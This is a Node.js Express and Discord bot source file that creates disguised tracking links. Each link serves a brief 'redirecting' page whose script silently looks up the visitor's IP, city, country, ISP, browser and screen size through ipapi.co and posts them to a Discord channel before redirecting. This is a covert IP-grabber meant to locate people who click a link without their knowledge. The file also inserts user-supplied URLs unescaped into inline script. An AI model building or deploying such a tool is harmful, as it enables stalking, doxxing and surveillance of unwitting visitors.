const express = require("express");
const cors = require("cors");
const { nanoid } = require("nanoid");
const dotenv = require("dotenv");
const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require("discord.js");

dotenv.config();

const app = express();
const puerto = process.env.PORT || 3000;
const links = {};

app.use(cors());
app.use(express.json());

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

const comando = new SlashCommandBuilder()
  .setName("crear")
  .setDescription("Crea un link de seguimiento")
  .addStringOption(function(op) {
    return op.setName("url").setDescription("URL destino").setRequired(true);
  });

client.once("ready", async function() {
  console.log("Bot conectado como " + client.user.tag);

  const rest = new REST({ version: "10" }).setToken(process.env.DISCORD_TOKEN);
  await rest.put(Routes.applicationCommands(client.user.id), {
    body: [comando.toJSON()],
  });

  console.log("Comando /crear registrado");
});

client.on("interactionCreate", async function(interaction) {
  if (!interaction.isChatInputCommand()) return;
  if (interaction.commandName !== "crear") return;

  const destino = interaction.options.getString("url");
  const codigo = nanoid(6);
  links[codigo] = { destino: destino, canal: interaction.channelId };

  const linkGenerado = process.env.BASE_URL + "/" + codigo;

  await interaction.reply("Link creado: " + linkGenerado);
});

app.get("/:codigo", function(req, res) {
  const entrada = links[req.params.codigo];

  if (!entrada) {
    return res.status(404).send("Link no encontrado");
  }

  const canal = client.channels.cache.get(process.env.DISCORD_CHANNEL_ID);

  const html = "<!DOCTYPE html><html><head><title>Redirigiendo...</title></head><body><p>Redirigiendo...</p><script>fetch('https://ipapi.co/json/').then(function(r){return r.json();}).then(function(data){var info={ip:data.ip,pais:data.country_name,ciudad:data.city,isp:data.org,userAgent:navigator.userAgent,idioma:navigator.language,pantalla:screen.width+'x'+screen.height,fecha:new Date().toISOString()};fetch('/log',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({info:info,codigo:'" + req.params.codigo + "'})});setTimeout(function(){window.location.href='" + entrada.destino + "';},1500);});<\/script></body></html>";

  res.send(html);
});

app.post("/log", async function(req, res) {
  const { info, codigo } = req.body;
  const canal = client.channels.cache.get(process.env.DISCORD_CHANNEL_ID);

  if (canal) {
    await canal.send(
      "Nueva visita al link `" + codigo + "`\n" +
      "IP: " + info.ip + "\n" +
      "País: " + info.pais + "\n" +
      "Ciudad: " + info.ciudad + "\n" +
      "ISP: " + info.isp + "\n" +
      "Navegador: " + info.userAgent + "\n" +
      "Pantalla: " + info.pantalla + "\n" +
      "Fecha: " + info.fecha
    );
  }

  res.json({ ok: true });
});

app.listen(puerto, function() {
  console.log("Servidor corriendo en puerto " + puerto);
});

client.login(process.env.DISCORD_TOKEN);
